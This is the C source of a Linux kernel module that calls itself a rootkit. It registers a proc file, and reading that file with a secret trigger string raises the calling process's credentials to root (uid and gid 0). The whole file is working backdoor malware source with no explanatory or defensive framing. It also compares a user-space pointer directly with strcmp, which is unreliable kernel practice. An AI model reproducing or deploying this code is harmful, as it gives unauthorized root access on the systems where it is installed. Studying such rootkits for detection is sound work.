#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/fs.h>
#include <linux/proc_fs.h>
#include <linux/cred.h>
#include <linux/string.h>

#include "rootkit.h"



static int check_command(const char __user *buff){
    // get privileges
    if(!strcmp(buff, get_root)){
        struct cred *new_cred = prepare_creds();
        new_cred->uid = KUIDT_INIT(0);
        new_cred->gid = KGIDT_INIT(0);
        new_cred->euid = KUIDT_INIT(0);
        new_cred->egid = KGIDT_INIT(0);
        commit_creds(new_cred);
    }
    else{
        return 0;
    }

    return 1;
}

static ssize_t read_fops(struct file *filp, char __user *buff, size_t count, loff_t *offp){
    check_command(buff);

    return count;
}

static struct file_operations proc_fops = {
    .owner = THIS_MODULE,
    .read = read_fops
};


static int rootkit_init(void){
    // init proc file
    proc_create(procfile, 0, NULL, &proc_fops);

    return 0;
}

static void rootkit_exit(void){
    remove_proc_entry(procfile, NULL);
}

module_init(rootkit_init);
module_exit(rootkit_exit);

